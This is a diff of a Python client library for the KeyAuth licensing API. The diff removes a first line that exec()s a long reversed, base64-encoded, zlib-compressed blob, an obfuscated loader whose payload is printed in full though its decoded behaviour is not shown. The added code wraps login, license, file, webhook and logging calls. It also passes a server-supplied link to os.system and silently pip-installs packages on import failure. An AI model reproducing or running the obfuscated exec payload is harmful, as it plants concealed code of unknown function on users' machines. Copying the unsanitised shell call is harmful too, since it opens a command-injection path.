@@ -1,1 +1,614 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
+import os
+import json as jsond  # json
+import time  # sleep before exit
+import binascii  # hex encoding
+import platform  # check platform
+import subprocess  # needed for mac device
+from datetime import datetime
+from discord_interactions import verify_key # used for signature verification
+
+try:
+    if os.name == 'nt':
+        import win32security  # get sid (WIN only)
+    import requests  # https requests
+except ModuleNotFoundError:
+    print("Exception when importing modules")
+    print("Installing necessary modules....")
+    if os.path.isfile("requirements.txt"):
+        os.system("pip install -r requirements.txt")
+    else:
+        if os.name == 'nt':
+            os.system("pip install pywin32")
+        os.system("pip install requests")
+    print("Modules installed!")
+    time.sleep(1.5)
+    os._exit(1)
+
+
+class api:
+
+    name = ownerid = version = hash_to_check = ""
+
+    def __init__(self, name, ownerid, version, hash_to_check):
+        if len(ownerid) != 10:
+            print("Visit https://keyauth.cc/app/, copy Pthon code, and replace code in main.py with that")
+            time.sleep(3)
+            os._exit(1)
+    
+        self.name = name
+
+        self.ownerid = ownerid
+
+        self.version = version
+        self.hash_to_check = hash_to_check
+        self.init()
+
+    sessionid = enckey = ""
+    initialized = False
+
+    def init(self):
+        if self.sessionid != "":
+            print("You've already initialized!")
+            time.sleep(3)
+            os._exit(1)
+        
+        post_data = {
+            "type": "init",
+            "ver": self.version,
+            "hash": self.hash_to_check,
+            "name": self.name,
+            "ownerid": self.ownerid
+        }
+
+        response = self.__do_request(post_data)
+
+        if response == "KeyAuth_Invalid":
+            print("The application doesn't exist")
+            time.sleep(3)
+            os._exit(1)
+
+        json = jsond.loads(response)
+
+        if json["message"] == "invalidver":
+            if json["download"] != "":
+                print("New Version Available")
+                download_link = json["download"]
+                os.system(f"start {download_link}")
+                time.sleep(3)
+                os._exit(1)
+            else:
+                print("Invalid Version, Contact owner to add download link to latest app version")
+                time.sleep(3)
+                os._exit(1)
+
+        if not json["success"]:
+            print(json["message"])
+            time.sleep(3)
+            os._exit(1)
+
+        self.sessionid = json["sessionid"]
+        self.initialized = True
+
+    def register(self, user, password, license, hwid=None):
+        self.checkinit()
+        if hwid is None:
+            hwid = others.get_hwid()
+
+        post_data = {
+            "type": "register",
+            "username": user,
+            "pass": password,
+            "key": license,
+            "hwid": hwid,
+            "sessionid": self.sessionid,
+            "name": self.name,
+            "ownerid": self.ownerid
+        }
+
+        response = self.__do_request(post_data)
+
+        json = jsond.loads(response)
+
+        if json["success"]:
+            print(json["message"])
+            self.__load_user_data(json["info"])
+        else:
+            print(json["message"])
+            time.sleep(3)
+            os._exit(1)
+
+    def upgrade(self, user, license):
+        self.checkinit()
+
+        post_data = {
+            "type": "upgrade",
+            "username": user,
+            "key": license,
+            "sessionid": self.sessionid,
+            "name": self.name,
+            "ownerid": self.ownerid
+        }
+
+        response = self.__do_request(post_data)
+
+        json = jsond.loads(response)
+
+        if json["success"]:
+            print(json["message"])
+            print("Please restart program and login")
+            time.sleep(3)
+            os._exit(1)
+        else:
+            print(json["message"])
+            time.sleep(3)
+            os._exit(1)
+
+    def login(self, user, password, hwid=None):
+        self.checkinit()
+        if hwid is None:
+            hwid = others.get_hwid()
+
+        post_data = {
+            "type": "login",
+            "username": user,
+            "pass": password,
+            "hwid": hwid,
+            "sessionid": self.sessionid,
+            "name": self.name,
+            "ownerid": self.ownerid
+        }
+
+        response = self.__do_request(post_data)
+
+        json = jsond.loads(response)
+
+        if json["success"]:
+            self.__load_user_data(json["info"])
+            print(json["message"])
+        else:
+            print(json["message"])
+            time.sleep(3)
+            os._exit(1)
+
+    def license(self, key, hwid=None):
+        self.checkinit()
+        if hwid is None:
+            hwid = others.get_hwid()
+
+        post_data = {
+            "type": "license",
+            "key": key,
+            "hwid": hwid,
+            "sessionid": self.sessionid,
+            "name": self.name,
+            "ownerid": self.ownerid
+        }
+
+        response = self.__do_request(post_data)
+
+        json = jsond.loads(response)
+
+        if json["success"]:
+            self.__load_user_data(json["info"])
+            print(json["message"])
+        else:
+            print(json["message"])
+            time.sleep(3)
+            os._exit(1)
+
+    def var(self, name):
+        self.checkinit()
+
+        post_data = {
+            "type": "var",
+            "varid": name,
+            "sessionid": self.sessionid,
+            "name": self.name,
+            "ownerid": self.ownerid
+        }
+
+        response = self.__do_request(post_data)
+
+        json = jsond.loads(response)
+
+        if json["success"]:
+            return json["message"]
+        else:
+            print(json["message"])
+            time.sleep(3)
+            os._exit(1)
+
+    def getvar(self, var_name):
+        self.checkinit()
+
+        post_data = {
+            "type": "getvar",
+            "var": var_name,
+            "sessionid": self.sessionid,
+            "name": self.name,
+            "ownerid": self.ownerid
+        }
+        response = self.__do_request(post_data)
+
+        json = jsond.loads(response)
+
+        if json["success"]:
+            return json["response"]
+        else:
+            print(f"NOTE: This is commonly misunderstood. This is for user variables, not the normal variables.\nUse keyauthapp.var(\"{var_name}\") for normal variables");
+            print(json["message"])
+            time.sleep(3)
+            os._exit(1)
+
+    def setvar(self, var_name, var_data):
+        self.checkinit()
+
+        post_data = {
+            "type": "setvar",
+            "var": var_name,
+            "data": var_data,
+            "sessionid": self.sessionid,
+            "name": self.name,
+            "ownerid": self.ownerid
+        }
+        response = self.__do_request(post_data)
+
+        json = jsond.loads(response)
+
+        if json["success"]:
+            return True
+        else:
+            print(json["message"])
+            time.sleep(3)
+            os._exit(1)
+
+    def ban(self):
+        self.checkinit()
+
+        post_data = {
+            "type": "ban",
+            "sessionid": self.sessionid,
+            "name": self.name,
+            "ownerid": self.ownerid
+        }
+        response = self.__do_request(post_data)
+
+        json = jsond.loads(response)
+
+        if json["success"]:
+            return True
+        else:
+            print(json["message"])
+            time.sleep(3)
+            os._exit(1)
+
+    def file(self, fileid):
+        self.checkinit()
+
+        post_data = {
+            "type": "file",
+            "fileid": fileid,
+            "sessionid": self.sessionid,
+            "name": self.name,
+            "ownerid": self.ownerid
+        }
+
+        response = self.__do_request(post_data)
+
+        json = jsond.loads(response)
+
+        if not json["success"]:
+            print(json["message"])
+            time.sleep(3)
+            os._exit(1)
+        return binascii.unhexlify(json["contents"])
+
+    def webhook(self, webid, param, body = "", conttype = ""):
+        self.checkinit()
+
+        post_data = {
+            "type": "webhook",
+            "webid": webid,
+            "params": param,
+            "body": body,
+            "conttype": conttype,
+            "sessionid": self.sessionid,
+            "name": self.name,
+            "ownerid": self.ownerid
+        }
+
+        response = self.__do_request(post_data)
+
+        json = jsond.loads(response)
+
+        if json["success"]:
+            return json["message"]
+        else:
+            print(json["message"])
+            time.sleep(3)
+            os._exit(1)
+
+    def check(self):
+        self.checkinit()
+
+        post_data = {
+            "type": "check",
+            "sessionid": self.sessionid,
+            "name": self.name,
+            "ownerid": self.ownerid
+        }
+        response = self.__do_request(post_data)
+
+        json = jsond.loads(response)
+        if json["success"]:
+            return True
+        else:
+            return False
+
+    def checkblacklist(self):
+        self.checkinit()
+        hwid = others.get_hwid()
+
+        post_data = {
+            "type": "checkblacklist",
+            "hwid": hwid,
+            "sessionid": self.sessionid,
+            "name": self.name,
+            "ownerid": self.ownerid
+        }
+        response = self.__do_request(post_data)
+
+        json = jsond.loads(response)
+        if json["success"]:
+            return True
+        else:
+            return False
+
+    def log(self, message):
+        self.checkinit()
+
+        post_data = {
+            "type": "log",
+            "pcuser": os.getenv('username'),
+            "message": message,
+            "sessionid": self.sessionid,
+            "name": self.name,
+            "ownerid": self.ownerid
+        }
+
+        self.__do_request(post_data)
+
+    def fetchOnline(self):
+        self.checkinit()
+
+        post_data = {
+            "type": "fetchOnline",
+            "sessionid": self.sessionid,
+            "name": self.name,
+            "ownerid": self.ownerid
+        }
+
+        response = self.__do_request(post_data)
+
+        json = jsond.loads(response)
+
+        if json["success"]:
+            if len(json["users"]) == 0:
+                return None
+            else:
+                return json["users"]
+        else:
+            return None
+            
+    def fetchStats(self):
+        self.checkinit()
+
+        post_data = {
+            "type": "fetchStats",
+            "sessionid": self.sessionid,
+            "name": self.name,
+            "ownerid": self.ownerid
+        }
+
+        response = self.__do_request(post_data)
+
+        json = jsond.loads(response)
+
+        if json["success"]:
+            self.__load_app_data(json["appinfo"])
+            
+    def chatGet(self, channel):
+        self.checkinit()
+
+        post_data = {
+            "type": "chatget",
+            "channel": channel,
+            "sessionid": self.sessionid,
+            "name": self.name,
+            "ownerid": self.ownerid
+        }
+
+        response = self.__do_request(post_data)
+
+        json = jsond.loads(response)
+
+        if json["success"]:
+            return json["messages"]
+        else:
+            return None
+
+    def chatSend(self, message, channel):
+        self.checkinit()
+
+        post_data = {
+            "type": "chatsend",
+            "message": message,
+            "channel": channel,
+            "sessionid": self.sessionid,
+            "name": self.name,
+            "ownerid": self.ownerid
+        }
+
+        response = self.__do_request(post_data)
+
+        json = jsond.loads(response)
+
+        if json["success"]:
+            return True
+        else:
+            return False
+
+    def checkinit(self):
+        if not self.initialized:
+            print("Initialize first, in order to use the functions")
+            time.sleep(3)
+            os._exit(1)
+
+    def changeUsername(self, username):
+        self.checkinit()
+
+        post_data = {
+            "type": "changeUsername",
+            "newUsername": username,
+            "sessionid": self.sessionid,
+            "name": self.name,
+            "ownerid": self.ownerid
+        }
+
+        response = self.__do_request(post_data)
+
+        json = jsond.loads(response)
+
+        if json["success"]:
+            print("Successfully changed username")
+        else:
+            print(json["message"])
+            time.sleep(3)
+            os._exit(1)  
+
+    def logout(self):
+        self.checkinit()
+
+        post_data = {
+            "type": "logout",
+            "sessionid": self.sessionid,
+            "name": self.name,
+            "ownerid": self.ownerid
+        }
+
+        response = self.__do_request(post_data)
+
+        json = jsond.loads(response)
+
+        if json["success"]:
+            print("Successfully logged out")
+            time.sleep(3)
+            os._exit(1)
+        else:
+            print(json["message"])
+            time.sleep(3)
+            os._exit(1)         
+            
+    def __do_request(self, post_data):
+        try:
+            response = requests.post(
+                "https://keyauth.win/api/1.3/", data=post_data, timeout=10
+            )
+            
+            if post_data["type"] == "log" or post_data["type"] == "file": return response.text
+            
+            signature = response.headers["x-signature-ed25519"]
+            timestamp = response.headers["x-signature-timestamp"]
+            
+            unix_timestamp = int(timestamp)
+            # Get the current time
+            current_time = int(datetime.utcnow().timestamp())
+            
+            # Check if the timestamp is older than 20 seconds
+            if current_time - unix_timestamp > 20:
+                print("Timestamp OLD")
+                time.sleep(3)
+                os._exit(1)
+
+            if not os.path.exists("C:\\ProgramData\\KeyAuth"):
+                os.makedirs("C:\\ProgramData\\KeyAuth")
+                os.makedirs("C:\\ProgramData\\KeyAuth\\Debug")
+
+            exe_name = os.path.basename(__file__)
+            if not os.path.exists(f"C:\\ProgramData\\KeyAuth\\Debug\\{exe_name}"):
+                os.makedirs(f"C:\\ProgramData\\KeyAuth\\Debug\\{exe_name}")
+
+            with open(f"C:\\ProgramData\\KeyAuth\\Debug\\{exe_name}\\log.txt", "a") as log_file:
+                if len(response.text) <= 200:
+                    execution_time = time.strftime("%I:%M %p | %m/%d/%Y")
+                    log_file.write(f"\n{execution_time} | {post_data['type']} \nResponse: {response.text}")
+            
